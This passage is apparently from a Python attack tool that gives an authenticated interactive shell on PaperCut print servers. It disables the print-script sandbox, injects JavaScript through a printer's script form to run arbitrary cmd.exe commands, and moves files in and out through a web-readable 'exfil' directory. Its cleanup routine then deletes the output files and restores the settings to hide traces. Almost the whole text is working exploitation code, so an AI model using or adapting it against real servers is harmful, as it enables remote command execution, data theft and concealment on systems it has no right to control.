JS_DIRLIST = r'''
try {
  var dirs = pcd_dirs();
  if (dirs.size() == 0) { throw 'no custom web dir resolved'; }
  var webdir = dirs.get(0);
  var serverDir = webdir.getParentFile().getParentFile();   // .../server
  var targetFile;
  if (__PATH__ != '') {
    targetFile = new java.io.File(__PATH__);
  } else {
    targetFile = new java.io.File(serverDir, 'web');        // .../server/web
  }
  var sb = new java.lang.StringBuilder();
  sb.append('\r\n==== ').append(targetFile.getPath()).append(' ====\r\n');
  var stack = new java.util.ArrayDeque();
  stack.push(targetFile);
  var count = 0;
  while (!stack.isEmpty() && count < __MAX__) {
    var f = stack.pop();
    if (!f.exists()) { continue; }
    var rel;
    try { rel = targetFile.toPath().relativize(f.toPath()).toString(); }
    catch (e) { rel = f.getPath(); }
    if (f.isDirectory()) {
      sb.append('D\t').append(rel).append('\r\n');
    } else {
      sb.append('F\t').append(rel).append('\t').append(f.length()).append('B\r\n');
    }
    count++;
    if (f.isDirectory()) {
      var kids = f.listFiles();
      if (kids != null) {
        for (var k = 0; k < kids.length; k++) { stack.push(kids[k]); }
      }
    }
  }
  pcd_write_append(__FILE__, sb.toString());
} catch (e) {
  pcd_write_append(__FILE__, 'PCERR: ' + e + '\r\n');
}
'''


class PaperCutShell:
    def __init__(self, base_url, session, webdir=None, chunk=262144):
        self.base_url = base_url.rstrip('/')
        self.session = session
        self.webdir = webdir
        self.chunk = chunk
        self.token = uuid.uuid4().hex[:8]
        self.probe_fname = f'pcsh_probe_{self.token}.txt'
        self.out_fname = f'pcsh_out_{self.token}.txt'
        self.cwd = 'C:\\'
        self.javaversion = '?'

    # -- low-level ----------------------------------------------------------
    def _apply(self, script_body):
        b = self.base_url
        headers = {'Origin': self.base_url}
        self.session.get(f'{b}/app?service=page/PrinterList',
                         data={'service': 'page/PrinterList'}, headers=headers, verify=False)
        self.session.get(f'{b}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001',
                         data={'service': 'direct/1/PrinterList/selectPrinter', 'sp': 'l1001'},
                         headers=headers, verify=False)
        self.session.get(f'{b}/app',
                         data={'service': 'direct/1/PrinterDetails/printerOptionsTab.tab', 'sp': '4'},
                         headers=headers, verify=False)
        data = {
            'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
            'sp': 'S0',
            'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
            'printerId': 'l1001',
            'enablePrintScript': 'on',
            'scriptBody': script_body,
            '$Submit$1': 'Apply',
        }
        r = self.session.post(f'{b}/app', data=data, headers=headers, verify=False)
        return r.status_code == 200 and ('Saved successfully' in r.text)

    def _pre(self):
        return JS_DISCOVER.replace('__WEBDIR__', js_str(self.webdir or ''))

    def _read(self, fname):
        url = f'{self.base_url}/custom/{fname}'
        for _ in range(4):
            try:
                r = self.session.get(url, verify=False, timeout=30)
                if r.status_code == 200:
                    body = r.content
                    low = body[:256].lower()
                    if body and (low.startswith(b'<!doctype') or low.startswith(b'<html')):
                        time.sleep(0.4); continue
                    return body
            except requests.RequestException:
                pass
            time.sleep(0.4)
        return None

    def _decode(self, raw):
        for enc in ('cp437', 'cp1252', 'utf-8'):
            try:
                return raw.decode(enc)
            except UnicodeDecodeError:
                continue
        return raw.decode('latin-1', 'replace')

    # -- discovery ----------------------------------------------------------
    def discover(self):
        if self.webdir:
            return True
        script = JS_DISCOVER.replace('__WEBDIR__', "''") + \
                 JS_PROBE.replace('__FILE__', js_str(self.probe_fname))
        self._apply(script)
        body = self._read(self.probe_fname)
        if not body:
            return False
        txt = body.decode('utf-8', 'replace')
        if not txt.startswith('WEB|'):
            return False
        parts = txt.split('|')
        if len(parts) >= 5:
            self.webdir = parts[1]
            self.javaversion = parts[4]
            # start shell in the JVM's working dir so paths feel native
            if '\\' in parts[3]:
                self.cwd = parts[3]
        return bool(self.webdir)

    # -- command execution ---------------------------------------------------
    def exec_raw(self, command):
        script = self._pre() + JS_EXEC \
            .replace('__CMD__', js_str(command)) \
            .replace('__CWD__', js_str(self.cwd)) \
            .replace('__FILE__', js_str(self.out_fname))
        self._apply(script)
        body = self._read(self.out_fname)
        if body is None:
            return None
        if body.startswith(b'PCERR'):
            return '<script-error> ' + body.decode('utf-8', 'replace')
        try:
            raw = base64.b64decode(body)
        except Exception:
            return body.decode('utf-8', 'replace')
        return self._decode(raw)

    # -- upload / download ---------------------------------------------------
    def upload(self, local, remote):
        if not os.path.isfile(local):
            print(f'[-] no such file: {local}')
            return
        data = open(local, 'rb').read()
        total = len(data)
        off = 0
        while off < total:
            part = data[off:off + self.chunk]
            b64 = base64.b64encode(part).decode('ascii')
            script = self._pre() + JS_UPLOAD \
                .replace('__B64__', js_str(b64)) \
                .replace('__PATH__', js_str(remote)) \
                .replace('__APPEND__', 'true' if off else 'false') \
                .replace('__OFFSET__', str(off)) \
                .replace('__FILE__', js_str(self.out_fname))
            self._apply(script)
            off += len(part)
        # verify final size
        script = self._pre() + JS_STAT \
            .replace('__PATH__', js_str(remote)) \
            .replace('__FILE__', js_str(self.out_fname))
        self._apply(script)
        t = self._read(self.out_fname)
        if t and t.startswith(b'STAT|'):
            p = t.decode().split('|')
            actual = int(p[3]) if len(p) > 3 and p[2] == 'true' else -1
            ok = 'OK' if actual == total else 'MISMATCH (remote=%s)' % actual
            print(f'[+] upload {ok}: {total} bytes -> {remote}')
        else:
            print(f'[+] upload finished (verification unavailable): {total} bytes -> {remote}')

    def download(self, remote, local):
        script = self._pre() + JS_STAT \
            .replace('__PATH__', js_str(remote)) \
            .replace('__FILE__', js_str(self.out_fname))
        self._apply(script)
        t = self._read(self.out_fname)
        if not t:
            print('[-] cannot stat remote file (channel unavailable?)')
            return
        if t.startswith(b'PCERR'):
            print('[-] ' + t.decode())
            return
        p = t.decode().split('|')
        if len(p) < 4 or p[1] != 'true' or p[2] != 'true':
            print(f'[-] not a readable file: {remote}')
            return
        length = int(p[3])
        with open(local, 'wb') as f:
            off = 0
            while off < length:
                ln = min(self.chunk, length - off)
                script = self._pre() + JS_DOWNLOAD \
                    .replace('__PATH__', js_str(remote)) \
                    .replace('__OFFSET__', str(off)) \
                    .replace('__LEN__', str(ln)) \
                    .replace('__FILE__', js_str(self.out_fname))
                self._apply(script)
                b = self._read(self.out_fname)
                if not b:
                    print('[-] chunk read failed'); return
                if b.startswith(b'PCERR'):
                    print('[-] ' + b.decode()); return
                try:
                    f.write(base64.b64decode(b))
                except Exception:
                    print('[-] bad base64 chunk'); return
                off += ln
        print(f'[+] download complete: {length} bytes -> {local}')

    # -- directory listing helper --------------------------------------------
    def dirlist(self, path=''):
        script = self._pre() + JS_DIRLIST \
            .replace('__PATH__', js_str(path)) \
            .replace('__MAX__', '10000') \
            .replace('__FILE__', js_str('list.txt'))
        self._apply(script)
        body = self._read('list.txt')
        if body is None:
            print('[-] list.txt not retrievable from /custom/')
            return
        print(f'[+] listing appended -> {self.base_url}/custom/list.txt '
              f'({len(body)} bytes)')
        print(self._decode(body)[-1500:])

    # -- cd emulation --------------------------------------------------------
    def _norm_path(self, p):
        p = p.replace('/', '\\')
        drive = self.cwd[:2] if (len(self.cwd) >= 2 and self.cwd[1] == ':') else 'C:'
        if len(p) >= 2 and p[1] == ':':
            drive, rest = p[:2], p[2:].lstrip('\\')
        else:
            rest = p
        stack = []
        for seg in rest.split('\\'):
            if seg in ('', '.'): continue
            if seg == '..':
                if stack: stack.pop()
            else:
                stack.append(seg)
        return drive + '\\' + '\\'.join(stack)

    def do_cd(self, arg):
        arg = arg.strip().strip('"')
        if not arg:
            return self.cwd
        if arg in ('\\', '/'):
            self.cwd = (self.cwd[:2] if self.cwd[1:2] == ':' else 'C:') + '\\'
            return self.cwd
        if arg.startswith('\\\\'):
            self.cwd = arg
        else:
            self.cwd = self._norm_path(arg)
        return self.cwd

    # -- banner / loop --------------------------------------------------------
    def banner(self):
        who = self.exec_raw('whoami') or ''
        host = self.exec_raw('hostname') or ''
        self.cwd = (self.exec_raw('cd') or '').strip() or self.cwd
        print('[+] Connected over the HTTP request/response channel '
              '(no reverse connection required)')
        print(f'    Target : {self.base_url}')
        print(f'    User   : {who.strip()}')
        print(f'    Host   : {host.strip()}')
        print(f'    CWD    : {self.cwd}')
        print(f'    Java   : {self.javaversion}')
        print('  Built-ins:  upload <local> <remote> | download <remote> <local>')
        print('              dirlist [path] | cd <dir> | help | exit')
        print('  Everything else is executed by cmd.exe in the remote CWD.\n')

    def interactive(self):
        self.banner()
        while True:
            try:
                line = input(f'{self.cwd}> ').strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not line:
                continue
            low = line.lower()
            if low in ('exit', 'quit'):
                break
            if low == 'help':
                print('upload <local> <remote>    push a file to the target')
                print('download <remote> <local>  pull a file from the target')
                print('dirlist [path]             append a recursive listing to list.txt (default: server\\web)')
                print('cd <dir>                   change remote working directory')
                print('exit                       restore settings and quit')
                continue
            if low.startswith('upload '):
                toks = shlex.split(line[7:])
                if len(toks) != 2:
                    print('usage: upload <local> <remote>')
                else:
                    self.upload(toks[0], toks[1])
                continue
            if low.startswith('download '):
                toks = shlex.split(line[9:])
                if len(toks) != 2:
                    print('usage: download <remote> <local>')
                else:
                    self.download(toks[0], toks[1])
                continue
            if low in ('cd', 'cd '):
                print(self.cwd)
                continue
            if low.startswith('cd '):
                print(self.do_cd(line[3:]))
                continue
            if low in ('dirlist', 'dirlist '):
                self.dirlist()
                continue
            if low.startswith('dirlist '):
                self.dirlist(line[8:].strip().strip('"'))
                continue
            out = self.exec_raw(line)
            if out is None:
                print('[-] no output (script timeout or /custom/ channel failed)')
            else:
                print(out, end='')

    # -- cleanup --------------------------------------------------------------
    def cleanup(self):
        print('[*] cleaning up: removing exfil files, restoring script + sandbox')
        try:
            names = js_strlist([self.probe_fname, self.out_fname, 'list.txt'])
            script = (JS_DISCOVER + JS_DELETE) \
                .replace('__WEBDIR__', js_str(self.webdir or '')) \
                .replace('__NAMES__', names)
            self._apply(script)
        except Exception:
            pass
        try:
            self._apply(JS_HOOK)
        except Exception:
            pass
        set_setting(self.base_url, self.session, 'print-and-device.script.enabled', 'N')
        set_setting(self.base_url, self.session, 'print.script.sandboxed', 'Y')


def main():
    ap = argparse.ArgumentParser(description='PaperCut authenticated print-script shell '
                                             'using only the HTTP request/response channel')
    ap.add_argument('-u', '--url', required=True, help='PaperCut base URL')
    ap.add_argument('-U', '--username', help='admin username')
    ap.add_argument('-P', '--password', help='admin password')
    ap.add_argument('--cookie', help='JSESSIONID to reuse an existing admin session')
    ap.add_argument('--webdir', help='absolute path to [app-path]/server/custom/web (skip autodiscovery)')
    ap.add_argument('--chunk', type=int, default=262144, help='file transfer chunk size in bytes')
    ap.add_argument('-c', '--command', help='run one command and exit (non-interactive)')
    args = ap.parse_args()

    sess = get_session_id(args.url, args.username, args.password, args.cookie)
    if not sess:
        sys.exit(1)

    sh = PaperCutShell(args.url, sess, webdir=args.webdir, chunk=args.chunk)

    print('[*] Enabling print scripting + disabling the sandbox (temporarily)')
    set_setting(args.url, sess, 'print-and-device.script.enabled', 'Y')
    set_setting(args.url, sess, 'print.script.sandboxed', 'N')

    try:
        if not sh.discover():
            print('[!] Could not locate /custom/ channel automatically. '
                  'Pass --webdir "C:\\Program Files\\PaperCut MF\\server\\custom\\web".')
        else:
            print(f'[+] custom/web exfil dir: {sh.webdir}')

        if args.command:
            out = sh.exec_raw(args.command)
            print(out if out is not None else '(no output)')
        else:
            sh.interactive()
    finally:
        sh.cleanup()


if __name__ == '__main__':
    main()
